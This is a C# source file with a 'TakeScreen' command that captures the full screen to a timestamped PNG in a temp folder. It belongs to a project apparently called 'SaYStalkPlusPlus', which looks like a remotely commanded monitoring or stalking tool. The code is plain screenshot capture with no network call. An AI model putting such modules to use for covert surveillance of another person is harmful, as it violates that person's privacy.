using System.Drawing.Imaging;

namespace SaYStalkPlusPlus.src.Commands
{
    class TakeScreen : ICommand
    {
        static public CommandResult Execute(string?[] args)
        {
            string filePath = Path.Combine(Program.TempFolder, DateTime.Now.ToString("u").Replace(':', '-'));

            try
            {
                if (!Directory.Exists(Program.TempFolder)) Directory.CreateDirectory(Program.TempFolder);

                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    bitmap.Save(filePath, ImageFormat.Png);
                }
            }
            catch (Exception ex)
            {
                return new CommandResult(false, null, $"Error while capturing a screen: {ex.Message}");
            }
            return new CommandResult(true, filePath, null, CommandResultType.Photo);
        }

    }
}
